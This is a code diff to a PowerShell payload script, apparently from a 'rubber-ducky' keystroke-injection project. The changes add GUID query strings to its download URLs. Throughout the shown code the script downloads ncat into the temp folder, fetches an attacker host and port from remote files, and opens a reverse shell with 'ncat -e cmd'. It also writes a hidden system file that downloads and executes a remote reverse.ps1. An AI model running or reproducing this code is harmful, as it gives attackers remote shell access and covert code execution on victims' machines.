@@ -6,9 +6,10 @@ $functions = {
 			[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 			New-Item -ItemType Directory -Force -Path "$env:TEMP\ncat"
 			((New-Object Net.WebClient).DownloadFile("https://raw.githubusercontent.com/gengstah/rubber-ducky/master/ncat/ncat.exe", "$env:TEMP\ncat\ncat.exe"))
-
-			$url = ((New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/gengstah/rubber-ducky/master/url.txt")).replace("`n","").replace("`r","")
-			$port = ((New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/gengstah/rubber-ducky/master/port.txt")).replace("`n","").replace("`r","")
+			
+			$guid = [Guid]::newGuid()
+			$url = ((New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/gengstah/rubber-ducky/master/url.txt?id=$guid")).replace("`n","").replace("`r","")
+			$port = ((New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/gengstah/rubber-ducky/master/port.txt?id=$guid")).replace("`n","").replace("`r","")
 
 			& "$env:TEMP\ncat\ncat.exe" -e cmd $url $port
 			
@@ -26,8 +27,9 @@ $functions = {
 			
 			if(-Not ([System.IO.File]::Exists($modulenamepath)))
 			{
+				$guid = [Guid]::newGuid()
 				Out-File -InputObject "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12" -Force $env:TEMP\$modulename
-				Out-File -InputObject '$scriptPath = ((New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/gengstah/rubber-ducky/master/reverse.ps1"))' -Append -NoClobber $env:TEMP\$modulename
+				Out-File -InputObject '$scriptPath = ((New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/gengstah/rubber-ducky/master/reverse.ps1?id=$guid"))' -Append -NoClobber $env:TEMP\$modulename
 				Out-File -InputObject "Invoke-Command -ScriptBlock ([scriptblock]::Create(`$scriptPath))" -Append -NoClobber $env:TEMP\$modulename
 				$modulenamefile = Get-Item $env:TEMP\$modulename
 				$modulenamefile.Attributes = "Hidden","System"
